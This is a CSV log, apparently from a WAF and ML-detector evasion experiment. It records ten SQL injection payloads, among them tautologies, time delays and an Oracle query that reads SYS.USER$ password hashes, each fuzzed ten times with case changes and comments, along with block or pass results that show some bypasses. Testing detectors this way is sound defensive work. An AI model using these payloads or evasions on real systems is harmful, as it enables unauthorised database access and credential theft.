Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
1,2025-10-28T13:24:26.126448," select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",403,403,403,both_correct," sEleCT * fROm users whERe id  =  '}' LIKE '}' || ""?
 (  "" OR/**/(SELECT 1)  =  1 -- (SELECT 1)",2025-10-28T13:24:51.693676,403,403,both_correct," SElEct * FrOM users wheRE id  =  '}' liKe '}' || ""?
 (	 "" Or (Select (SELECT (SELECT 1)))  =  'p>(' liKE 'p>(' -- (SELECT 1)P",2025-10-28T13:25:08.910569,403,403,both_correct,"
SeLeCt * fRom users WHeRe id   LIKE   '}' Like '}' || ""?
 (	 ""/**/OR (sELECt (sELect (Select (SELECT  AND 1)=3410)))  =  'p>(' LikE 'p>(' -- (SELECT 1)P	
",2025-10-28T13:25:25.667327,403,403,both_correct,"
seleCt * from users wHErE id   lIkE   '}' LikE '}'  OR  ""?
 (	 ""/**/Or (sELECT (SeLECt (sElEct (seLECT /**/aND 8660=8660)=(SELECT	 AND 1))))  =  'p>(' lIke 'p>(' -- (SELECT 1)P	
`I",2025-10-28T13:25:41.729565,403,403,both_correct,"
sEleCT * FROM users WhERE id   lIKE  /**/'}' LIKe '}'	 Or  ""?
 (	 ""/**/or (SElEcT (sEleCt (sElECT (SElEct /*;3MH*/And 8660 lIkE 8660)=(sEleCT	 and (SeleCt 5026 NOT LIKE 5027)))))  =  'p>(' lIke 'p>(' -- (SELECT  AND 1)P	
`I",2025-10-28T13:25:59.330418,403,403,both_correct,"
SeleCT * frOM users whErE id   lIke  /*t*/'}' lIke '}'	 or  ""?
 (
 ""/**/|| (sEleCt (SeLEcT (SeLect (SeLeCt /*;3MH*/And 8660 LIke  AND 1)=(SelecT	 And (SEleCT 0x13a2 NOT LIKE 3888 NOT LIKE 3889)))))  =  'p>(' LikE 'p>('/**/-- (SELECT  AND 1)P	
`I",2025-10-28T13:26:15.882474,403,403,both_correct,"
Select * from users wHerE id   LIke  /**/'}' likE '}'	 or  ""?
 (
 "" || (seLEcT (selecT (select (SELeCt /*;3MH*/aNd 8660 LikE  aND 1)=(seLeCT	 anD (SElECt 0x13a2 NOT LIKE 'Z,'<>'Z,~' NOT LIKE 0xf31)))))  =
 'p>(' LiKE 'p>('/**/-- (SELECT  AND  OR 0)P	
`I\",2025-10-28T13:26:32.466661,403,403,both_correct,"
sELECt * FROm users wHERe id   like  /*H*/'}' LiKE '}'	 or  ""?
 (
 ""/**/|| (sEleCt (SeLect (seLeCT (SeLECT /*;3MH*/AnD  ANd 1 liKe  And (sELecT 1))=(sELEcT	 ANd (SElEcT 0x13a2 NOT LIKE 'Z,'<>'Z,~' NOT LIKE 0xf31)))))  =
 'p>(' like 'p>('/**/-- (SELECT  AND  OR '$' NOT LIKE '$v')P

`I\",2025-10-28T13:26:48.473285,403,403,both_correct,"
SELect * frOm users/**/wheRe id   like  /**/'}' lIkE '}'	 Or  ""?
 (  ""/**/|| (selEct (seLecT (selECT (SELecT /*;3MH*/and  anD (SELECt 1) LIkE  AND (selEct  OR 'b@' LIKE 'b@'))=(sELECt	 And (SeLeCt 0x13a2 NOT LIKE 'Z,'<>'Z,~' NOT LIKE 0xf31)))))   liKE 
 'p>(' liKe 'p>('/**/-- (SELECT  AND  OR '$' NOT LIKE '$v')P

`I\I",2025-10-28T13:27:05.938630,403,403,both_correct,"
SeLECt * FrOm users/**/WHeRe id   LikE   '}' Like '}'	 or  ""?
 (  ""/**/|| (sElEct (SelECT (SeLECT (sEleCt /*;3MH*/AnD  and	(SELECt (SELECt 6870 IN (6869,6870, && 1))) LIKe  AnD (SElECt  oR 'b@' Like 'b@'))=(SELect	 aNd (sELECT 0x13a2 NOT LIKE 'Z,'<>'Z,~' NOT LIKE 0xf31)))))   LIke 
 'p>(' LIkE 'p>('/**/-- (SELECT  AND  OR '$' NOT LIKE '$v')P

`I\I^",2025-10-28T13:27:23.207315,403,403,both_correct
2,2025-10-28T13:27:47.517231,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,403,403,403,both_correct,"seleCt * frOm users wHErE id   like 
 1 or \.<(SELECT 1)/*w*/oR (SELECT 1)  =  1 -- 'u'='u'",2025-10-28T13:28:12.561169,403,403,both_correct,"SeLECT * fRom users whErE id   like 
 0x1 or \.<(SELEcT/**/ AND 1)/**/Or (seLeCT 1) 
=  '^.' like '^.' -- 'u'='u'",2025-10-28T13:28:26.061937,403,403,both_correct,"sELecT * From users where id   LIKe 
 0x1 OR \.<(sElEcT  aND  Or '^' like '^')/**/or (SEleCT (SELECT
1)) 
=  '^.' like '^.' -- 'u'='u']7",2025-10-28T13:28:42.028162,403,403,both_correct,"seLEct * FroM users whErE id   like 	 0x1 or \.<(selECt  And  oR '^' LIKe '^') Or (SeLeCt (sElecT
 or ';g' NOT LIKE ';gF')) 
=  '^.' like '^.' -- 'u'='u']0x7tq",2025-10-28T13:28:58.772804,403,403,both_correct,"sELeCT * fROm users wheRe id   LIkE 	 0x1 Or \.<(SElecT  and  OR/**/'^' like '^') or (seLect (SELect

oR ';g' NOT LIKE ';gF')) 
 LIKE   '^.' LIke '^.' -- (SELECT 1)]0x7tq",2025-10-28T13:29:15.758398,403,403,both_correct,"select * FROM users wHere id   like 	 0x1 Or \.<(selEcT  aNd  ||/*(SELEct 7002=7002)'*/'^' like '^') or (seLect (SELect

oR ';g' NOT LIKE ';gF')) 
/**/LIKE   '^.' LIke
'^.' -- (SELECT 0x1)]0x7tq",2025-10-28T13:29:32.681361,403,403,both_correct,"select * FRoM users WhERe id   like 
 0x1 Or \.<(sELect  ANd  ||/*(Select 7002=(sElECt 1) liKE 0xb1f)'*/'^' like '^') or (seLect (SELect

oR ';g' NOT LIKE ';gF')) 
/*F*/LIKE /**/ '^.' LIke
'^.' -- (SELECT 0x1)]0x7tq",2025-10-28T13:29:49.759439,403,403,both_correct,"SeLect * fROm users whErE id   lIKe 
 0x1 or \.<(SeLECt  anD  ||/*(SeLeCT  OR 0x0=(sElEct 'R'='R') like 0xb1f)'*/'^' like '^') or (seLect (SELect

oR ';g' NOT LIKE ';gF'))	
/*F*/LIKE /**/ '^.'/**/LIke
'^.' -- (SELECT 0x1)]0x7tq",2025-10-28T13:30:06.958928,403,403,both_correct,"sELecT * fROm users WHeRe id   LIKe 
 0x1 OR \.<(SelecT  aND  ||/*(SELeCT  Or 0x0 LIKE (sELECT  anD 4146 IN (4145,(SELECT 4146),4147)) LikE 0xb1f)'*/'^' like '^') or (seLect (SELect

oR ';g' NOT LIKE ';gF'))		/*F*/LIKE /**/ '^.'/**/LIke
'^.' --/*ydq}*/(SELECT 0x1)]0x7tq",2025-10-28T13:30:24.875394,403,403,both_correct,"SeLECT * frOm users Where id   LikE 
 0x1 oR \.<(SeLect  AnD  ||/*(sELecT  Or 0x0 Like (sELeCT  aNd  and 1 In (4145,(sELeCt 8606 IN (8605,8606,8607)),0x1033)) lIke 0xb1f)'*/'^' like '^') or (seLect (SELect
 oR ';g' NOT LIKE ';gF'))		/*F*/LIKE /**/ '^.' LIke
'^.' --/**/(SELECT 0x1)]0x7tq",2025-10-28T13:30:42.490225,403,403,both_correct
3,2025-10-28T13:30:59.521090, or true--,403,200,200,both_incorrect,"
or/**/true--",2025-10-28T13:31:15.512885,200,403,waf_incorrect_ml_correct,"	||/*As.o8*/true--",2025-10-28T13:31:34.319054,200,403,waf_incorrect_ml_correct,/**/||/*p*/true--,2025-10-28T13:31:51.303762,200,403,waf_incorrect_ml_correct,/*T}RT*/ OR  true--,2025-10-28T13:32:08.256826,200,403,waf_incorrect_ml_correct,"/*T}RT*/ ||	/**/true--",2025-10-28T13:32:25.108532,200,403,waf_incorrect_ml_correct,"/*z(-l*/  oR 		true--",2025-10-28T13:32:42.579094,200,403,waf_incorrect_ml_correct,"/*z(-l*/ 	or/**/		true--",2025-10-28T13:33:00.453497,200,403,waf_incorrect_ml_correct,"/*z(-l*/		Or/**/		true--",2025-10-28T13:33:26.506195,200,403,waf_incorrect_ml_correct,"/*z(-l*/		oR 
	true--",2025-10-28T13:33:49.775323,200,403,waf_incorrect_ml_correct,"/*z(-l*/		or/**/ 	true--",2025-10-28T13:34:06.822189,200,403,waf_incorrect_ml_correct
4,2025-10-28T13:34:29.800405,s,403,200,200,both_incorrect,s,2025-10-28T13:34:51.877461,200,403,waf_incorrect_ml_correct,s,2025-10-28T13:35:17.923001,200,200,both_incorrect,s,2025-10-28T13:35:42.662727,200,200,both_incorrect,s,2025-10-28T13:36:04.062218,200,200,both_incorrect,s,2025-10-28T13:36:19.610749,200,200,both_incorrect,s,2025-10-28T13:36:35.693431,200,200,both_incorrect,s,2025-10-28T13:36:51.718373,200,200,both_incorrect,s,2025-10-28T13:37:10.741147,200,200,both_incorrect,s,2025-10-28T13:37:29.915481,200,200,both_incorrect,s,2025-10-28T13:37:46.928868,200,200,both_incorrect
5,2025-10-28T13:38:03.499209," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",403,403,403,both_correct," AnD 1  =  utl_inaddr.get_host_address /**/ (    (   selECt DIStinCt  (  PASSWORD  ) 	 FroM   (  sElecT dIStinCT  (  PASSWORD  )  , ROWNUM As LIMIT FRom SYS.USER$  )   WherE LIMIT  =   aNd (SeLeCT 8930) likE 8930   )    )    ANd 'i'   likE   'i",2025-10-28T13:38:19.775606,403,403,both_correct," AnD 1  =  utl_inaddr.get_host_address   (    (   SelECT disTinCT  (  PASSWORD  ) 	 frOm   (  seLEcT distiNcT  (  PASSWORD  )  , ROWNUM aS LIMIT from SYS.USER$  )   WHere LIMIT  =   AND
(selEcT 0x14bc NOT LIKE 5309) LiKE  OR 0   )    )    and 'i'   liKE   'i",2025-10-28T13:38:37.128251,403,403,both_correct," aND '

' NOT LIKE ' 
h'   like   utl_inaddr.get_host_address   (    (   sELecT DistiNct  (  PASSWORD  ) 	 FRoM   (  sElECt DIstInct  (  PASSWORD  )  , ROWNUM aS LIMIT FRom SYS.USER$  )   whERe LIMIT  =   AnD
(SEleCT 0x14bc NOT LIKE (SELECT 1)) lIKE  or 0x0   )    )    And 'i'   liKE /**/ 'i",2025-10-28T13:38:54.984987,403,403,both_correct," AnD '

' NOT LIKE ' 
h'   lIke   utl_inaddr.get_host_address   (    (   SelECt dIstInCT  (  PASSWORD  ) 	 fRoM   (  SElect DisTiNCt  (  PASSWORD  )  , ROWNUM aS LIMIT fRoM SYS.USER$ 	)   WHEre LIMIT  =   AND
(sElEct 0x14bc NOT LIKE (seLEcT '~U' lIKE '~U')) LIKe  Or 0x0   )    ) /**/  and 'i'   liKE /**/ 'i",2025-10-28T13:39:11.089290,403,403,both_correct," And ' 
' NOT LIKE ' 
h'   liKe   utl_inaddr.get_host_address   (    (   SELecT DIstInCt  (  PASSWORD  ) 	 From   (  SeleCT DistINCt  (  PASSWORD  )  , ROWNUM AS LIMIT From SYS.USER$/**/	)   wherE LIMIT  =   aND
(SeLeCt 0x14bc not like (Select '~U' LIKE '~U')) lIKE  or 0x0   )    ) /*Bk*/  and 'i'   like /**/ 'i",2025-10-28T13:39:29.599206,403,403,both_correct," and ' 
' NOT LIKE ' 
h'   LiKE   utl_inaddr.get_host_address /**/ (    (   SeLECT DistinCt  (  PASSWORD  ) 	 fROm   (  seLeCt	DistINCt  (  PASSWORD  )  , ROWNUM As LIMIT FrOM SYS.USER$/**/	)   wHeRe LIMIT  =   AnD
(SeLeCT 0x14bc not like (SELECT '~U' lIKe '~U')) LIke  or 0x0   )    ) /**/  ANd 'i'   lIKE /**/ 'i",2025-10-28T13:39:46.757157,403,403,both_correct," And ' 
' NOT LIKE ' 
h'   LIKE   utl_inaddr.get_host_address /**/ (    (   SEleCT DIStINcT  (  PASSWORD  ) 	 from   (  sELect	dIstiNCt  (  PASSWORD  )  , ROWNUM aS LIMIT FRoM SYS.USER$/**/	)   WhErE LIMIT   LiKe    And (seLECt 0x14bc not like (SElEct '~U' likE '~U')) LiKE /**/Or 0x0   )    ) /**/  anD 'i'   Like /*
;*/ 'i",2025-10-28T13:40:03.840680,403,403,both_correct," AnD ' 
' not like ' 
h'   lIKe   utl_inaddr.get_host_address /*ne*/ (    (   SEleCt diSTINct  (  PASSWORD  )   from   (  seLecT	dIstINcT  (  PASSWORD  )  , ROWNUM aS LIMIT fRom SYS.USER$/**/	)   WHERe LIMIT /**/ lIKE    and (sELecT 0x14bc not like (sEleCT '~U' like '~U')) lIKe /**/oR 0x0   )    ) /**/  aND 'i'   like /*
;*/ 'i",2025-10-28T13:40:20.356721,403,403,both_correct," aNd ' 	' not like ' 
h'   LIke   utl_inaddr.get_host_address /*ne*/ (    (   seLeCt dIStInCT  (  PASSWORD  )   from   (  SelECt	disTiNcT  (  PASSWORD  )  , ROWNUM aS LIMIT FROm SYS.USER$/**/	)   WHerE LIMIT /**/ like    AnD (SeLEcT 0x14bc not like (seLEct '~U' like '~U')) liKe /**/Or 0x0   )/**/   ) /**/  AnD 'i'   likE /*
;*/ 'i",2025-10-28T13:40:38.324434,403,403,both_correct," AnD ' 	' not like ' 
h'   liKE   utl_inaddr.get_host_address /*ne*/ (    (   SeLECT dIStINCT  (  PASSWORD  )   FRoM   (  seLeCt	dIStincT  (  PASSWORD  )  , ROWNUM As LIMIT fRom SYS.USER$/**/	)   whErE LIMIT /**/ like    AnD (SElECt 0x14bc not like (seleCt '~U' LIke '~U')) Like /**/or 0x0   )/**/   )    And 'i'	  LiKe /*
;*/ 'i",2025-10-28T13:40:54.275907,403,403,both_correct
6,2025-10-28T13:41:11.041355,"""  )   or sleep  (  __TIME__  )    =  """,403,403,200,waf_correct_ml_incorrect,""" 
)   or sleep  (  __TIME__/**/ )    =  """,2025-10-28T13:41:27.283175,403,403,both_correct,"""  )  /**/or sleep  (  __TIME__/*+*/ )    =  """,2025-10-28T13:41:46.087557,403,403,both_correct,"""  )  /**/or sleep  ( 	__TIME__  )    =  """,2025-10-28T13:42:10.809587,403,403,both_correct,"""
/**/)  /**/or sleep  ( 	__TIME__  )    =  """,2025-10-28T13:42:36.863382,403,403,both_correct,"""	/**/)   or sleep  ( 	__TIME__  )    =  """,2025-10-28T13:43:02.931040,403,403,both_correct,""" /*FbO*/)   or sleep/**/ ( 	__TIME__  )    =  """,2025-10-28T13:43:24.785943,403,403,both_correct,""" /*'*>*/)   or sleep/**/ ( 	__TIME__ /**/)    =	 """,2025-10-28T13:43:40.951080,403,403,both_correct,""" /*'*>*/)   or sleep/**/ ( 	__TIME__ /*t,* AND/**/'Wy""' LIKE 'Wy""'*/)    =
 """,2025-10-28T13:44:05.306431,403,403,both_correct,""" /*'*>*/)   or sleep/**/ ( 	__TIME__ /*t,* AND 'Wy""' LIKE 'Wy""'*/)    =  """,2025-10-28T13:44:24.597474,403,403,both_correct,""" /*'*>*/)   or sleep/**/ ( 	__TIME__ /*t,*	AND 'Wy""' LIKE/*`**/'Wy""'*/)    =  """,2025-10-28T13:44:40.758240,403,403,both_correct
7,2025-10-28T13:44:58.235223,a' waitfor delay '0:0:10'--,403,403,403,both_correct,"a'/**/waitfor delay	'(SELECT 1):0:0x5d0 IN (1487,1488,1489)'--",2025-10-28T13:45:13.079538,403,403,both_correct,"a'/**/waitfor delay	'(seLEcT 1):(SELeCT
0):0x5d0 iN/*KY.m*/(1487,'8'!='83', or 0)'--",2025-10-28T13:45:30.269251,200,403,waf_incorrect_ml_correct,"a' waitfor delay	'(SeleCT 1):(SeLECT	0):0x5d0 iN/*KY.m*/(1487,' OR 0'<>'83', or (SELECT '['<>'[w'))'--",2025-10-28T13:45:46.956921,403,403,both_correct,"a' waitfor delay	'(SeLECt  And 1):(sELECt	0x0):0x5d0	In/**/(1274<>1275,' OR 0'<>'83', or (SELEct '['/*#bz0*/NOT LIKE '[w'))'--",2025-10-28T13:46:03.435346,403,403,both_correct,"a' waitfor delay	'(SelecT  and '5' LIKE '5'):(seLEct	0x0):0x5d0	in (1274 not like 0x4fb,' OR 
AND 1'<>'83', OR (sElECT '['/*#bz0*/NOT LIKE '[w'))'--z",2025-10-28T13:46:22.875996,403,403,both_correct,"a' waitfor delay '(SelecT/**/ AnD '(SELECT 5)' likE '5'):(sELect	0x0):0x5d0	in (' g'<>' gY' not like 0x4fb,' OR 
AND (SELECT 1)'<>'83', OR (sElEct '['/**'m*/NOT LIKE '[w'))'--z",2025-10-28T13:46:42.545355,403,403,both_correct,"a' waitfor delay '(SElECT/**/ anD '(SELECT 5)' LikE ' OR 0'):(SElect	0x0):0x5d0	IN (' g'<>' gY' not like 0x4fb,' OR/**/	AND (SELECT 9781 NOT LIKE (SELECT 9782))'<>'83', || (SelecT '['/**'m*/NOT LIKE '[w'))'--z",2025-10-28T13:47:08.608891,403,403,both_correct,"a' waitfor delay '(SELEct 
and '(SELECT 5)' lIKe ' OR 0'):(seLECT	0x0):0x5d0	IN (' g'<>' gY' not like 0x4fb,' OR/*=*/	AND (SELECT (SELECT ':%>'!=':%>]') NOT LIKE (SELECT 9782))'!=' OR 0', || (SelEcT '['/**'m*/NOT LIKE '[w'))'--z",2025-10-28T13:47:34.661837,403,403,both_correct,"a' waitfor delay '(SeLecT 	ANd '(SELECT 6450 IN (0x1931,6450,6451))' like ' OR 0'):(SElEcT	0x0):0x5d0	iN (' g'<>' gY' not like 0x4fb,' OR/*)*/	AND (SELECT (SELECT ':%>'!=':%>]') NOT LIKE (SELECT (SELECT 1)))'<>' OR 0', || (sELEcT '['/**'m*/NOT/**/LIKE '[w'))'--z",2025-10-28T13:47:56.322068,403,403,both_correct,"a' waitfor delay '(sELeCt 	aNd/* d*/'(SELECT  OR 0 IN (0x1931,6450,(SELECT 6451)))' lIke ' OR 5682 LIKE 5682'):(SELecT	0x0):0x5d0 iN (' g' NOT LIKE ' gY' not like 0x4fb,' OR/*)*/	AND (SELECT (SELECT ':%>'!=':%>]') NOT LIKE (SELECT (SELECT 1)))'<>' OR 0', || (sElEcT '['/**'m*/NOT/**/Like '[w'))'--z",2025-10-28T13:48:22.154378,403,403,both_correct
8,2025-10-28T13:48:44.230095,"admin"" or 1  =  1",403,403,403,both_correct,"admin"" or 0x1
 =  (seLEct 'b&K?' NOT LIKE/**/'b&K?N')",2025-10-28T13:49:04.336399,403,403,both_correct,"admin"" Or 0x1  =  (SelECT 'b&K?'/**/not like/*;<F<*/'b&K?N')",2025-10-28T13:49:27.648447,403,403,both_correct,"admin"" oR 0x1   LIKE   (SElECT
'b&K?' not like/**/'b&K?N')",2025-10-28T13:49:47.546533,403,403,both_correct,"admin"" oR 0x1   LIke   (SEleCT 'b&K?' not like 'b&K?N')",2025-10-28T13:50:04.734411,403,200,waf_correct_ml_incorrect,"admin"" or 0x1   LIKE  	(selEct 'b&K?' not like/*?U*/'b&K?N')",2025-10-28T13:50:20.305312,403,403,both_correct,"admin"" or 0x1   LiKE  
(SELect 'b&K?' not like 'b&K?N')",2025-10-28T13:50:41.217345,403,200,waf_correct_ml_incorrect,"admin"" Or 0x1   lIKe /**/ (SEleCT 'b&K?' not like 'b&K?N')",2025-10-28T13:51:03.251088,403,403,both_correct,"admin"" OR 0x1  
lIKe   (sEleCT 'b&K?' not like 'b&K?N')",2025-10-28T13:51:25.670178,403,200,waf_correct_ml_incorrect,"admin"" or 0x1/**/ 	liKe   (sELeCt 'b&K?' not like 'b&K?N')",2025-10-28T13:51:50.212078,403,403,both_correct,"admin"" OR 0x1/**/ 	Like   (sELeCT 'b&K?'	not like/*H	(?:*/'b&K?N')",2025-10-28T13:52:13.532588,403,403,both_correct
9,2025-10-28T13:52:34.464230," select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",403,403,403,both_correct," seLecT/**/* FRom users	wheRe id   lIKE   1 OR 1#""?  =  0x1 oR 2944 NOT LIKE 2945  =   AND 1 -- 1",2025-10-28T13:52:55.701352,403,403,both_correct," seLecT/**/* FRom users WHERE id   lIkE/**/  0x1026!=4135 Or 1#""?  =  0x1 Or 2944 NOT LIKE  OR 0  =   && 1 -- 1.",2025-10-28T13:53:20.664874,403,403,both_correct," SELECT/**/* FRoM users whERe id/**/  lIke/**/  0x1026!= OR 0 LIKe 7792 or	1#""?  =  0x1 Or 2944 NOT LIKE  or 0   lIke    && 1 -- (SELECT 1)..",2025-10-28T13:53:46.715581,403,403,both_correct," seleCt/*jK)*/* fROm users WHErE id/**/  lIKE/**/  0x1026 not like/**/ Or 0x0 LIkE 7792 or 'i' lIKe 'i'#""?  =  0x1 Or 2944 NOT LIKE  OR 0   lIKe    && (SELECT 1) -- (SELECT 1)..",2025-10-28T13:54:11.514040,403,403,both_correct," SeLECt/*jK)*/* fRoM users WHErE id/**/  likE/**/  0x1026 not like/**/ or 0x0 liKE 7792 Or 'i' lIkE 'i'#""?  =	 0x1 oR 2944 NOT LIKE  OR 0x0   likE     And  (SELeCT 1) -- (SELECT/**/ AND 3971 LIKE 3971)..$",2025-10-28T13:54:30.794093,403,403,both_correct," seLeCt/*jK)*/* FROM users WHeRE id/**/  liKE/**/  0x1026 not like/**/ Or 0x0 LiKE 0x1e70 oR 'i' LIkE 'i'#""?  =	 0x1 Or 2944 not like  or 0x0   LIKe     aNd /**/(sELect '']'!='']Y')
-- (SELECT/**/ AND  OR 0 LIKE 3971)..$e",2025-10-28T13:54:51.373759,403,403,both_correct," SelEcT/*jK)*/* fROm users WhERe id/**/  LIkE/**/  0x1026 not like/**/ OR 0x0 like 0x1e70 oR 'i' liKE 'i'#""?  =  0x1 or 4461!=4462 not like  OR 0x0   lIKE     anD /*{$*/(seLEct '']'!='']Y')
-- (SELECT/**/ AND  OR  AND 1 LIKE/**/0xf83)..$e",2025-10-28T13:55:09.467178,403,403,both_correct," SeLecT/*jK)*/* froM users WhErE id/**/  lIKe/**/  0x1026 not like/**//**/|| 0x0 likE 0x1e70 Or 'i' lIkE 'i'#""?  =  0x1 or (SELECT 5844)<>5845!= OR 0 not like  or 0x0   likE     AnD /*{$*/(SELecT '']'!='']Y')	-- (SELECT/**/ AND  OR  AND 1 LIKE/**/0xf83)..$e.",2025-10-28T13:55:26.706581,403,403,both_correct," seLeCt/*jK)*/* fROM users WHErE id/**/  LIKE/**/  0x1026
not like/**//**/|| 0x0 LiKE 0x1e70 OR 'i' LIKe 'i'#""?   LiKe   0x1 or (sELeCt 5844)<>(SELECT 1)!= or 0 not like  or 0x0   lIKE     aND /*{$*/(seLeCT '']'!='']Y')	-- (SELECT/**/ AND  OR/**/ AND (SELECT 4571 NOT LIKE 4572) LIKE/**/0xf83)..$e.a",2025-10-28T13:55:46.494858,403,403,both_correct," SELeCt/*jK)*/* FrOM users whERE id/**/  LIKE/**/  0x1026
not like/**//**/|| 0x0 lIKE 0x1e70 OR 'i' LIkE 'i'#""?   liKE   0x1 oR (SeLecT 0x16d4)<>(SELEct  or 6551!=6552)<> OR 0 not like  or 0x0 /**/ LIKE     And /*{$*/(seLEcT '']'!='']Y') -- (SELECT/**/ AND  OR/**/ AND (SELECT 4571 NOT LIKE 4572) LIKE/**/0xf83)..$e.a	1",2025-10-28T13:56:11.022180,403,403,both_correct
10,2025-10-28T13:56:32.153124," select * from users where id  =  1 or "",."" or 1  =  1 -- 1",403,403,403,both_correct," SELecT	* FRoM users WHERE id  =  (sElEcT 1) oR "",.""/**/OR  && 1  =  '_' NOT LIKE '_V' -- 1ZV",2025-10-28T13:56:48.826422,403,403,both_correct," sELect	* fROM users
wHeRe id  =  (selECt (Select 1)) or "",.""/**/or  && (selECT 'H?' LIKe 'H?')  =  '_' not like '_V' --/**/1ZVB",2025-10-28T13:57:07.146762,403,403,both_correct," sElECt	* fRom users wHEre id  =  (seLECT (Select 0x1)) Or "",."" or  && (SELeCt 'H?' lIkE 'H?')   like   '_' not like '_V' --/**/1ZVB",2025-10-28T13:57:24.884699,403,403,both_correct," SELECt	* fROm
users WHere id  =  (selecT (SelecT 0x1)) oR "",."" Or   AND  (SeLECt 'H?' lIkE 'H?')   LiKe   '_' not like '_V' -- 1ZVB",2025-10-28T13:57:41.970181,403,403,both_correct," SeleCT	* froM
users wHere id   LIKE   (sElecT (seLECT 0x1)) or "",."" oR   ANd/**/ (sELEct 'H?' LIKe 'H?')  
LiKe   '_' not like '_V' -- 1ZVB",2025-10-28T13:58:03.679567,403,403,both_correct," SelECT	* frOm
users whERe id  	liKE   (sElECt (selEct 0x1)) or "",."" Or   aNd  (SElECt 'H?' liKE 'H?')  
lIkE   '_' not like '_V' -- 1ZVB",2025-10-28T13:58:26.403979,403,403,both_correct," seLECt * From
users WherE id/*F|*/ 	LIKE   (sElECT (sElEcT 0x1)) OR "",."" oR   aNd  (SELeCT 'H?' LiKe 'H?')  
lIkE   '_' not like '_V' -- 1ZVB",2025-10-28T13:58:46.545098,403,403,both_correct," SElECt * FRoM
users wherE id/*F|*/ 	lIke   (SeleCt/**/(sElECt 0x1)) oR "",."" or   And  (SeLECt 'H?' lIKe 'H?')   likE   '_' not like '_V' -- 1ZVB",2025-10-28T13:59:12.598918,403,403,both_correct," select * FrOm users WhErE id/*F|*/ 	LIKe /**/ (selEcT/**/(seleCT 0x1)) or "",."" oR   anD  (SeLEct 'H?' likE 'H?')   lIkE   '_' not like '_V' -- 1ZVB",2025-10-28T13:59:28.484187,403,403,both_correct," seLECt * FrOm users wHere id/*F|*/ 
lIkE /**/ (seleCT (sELECt 0x1)) Or "",."" oR   ANd  (seLect 'H?' LIkE 'H?')   LIKE   '_' not like '_V' -- 1ZVBF",2025-10-28T13:59:46.378308,403,403,both_correct
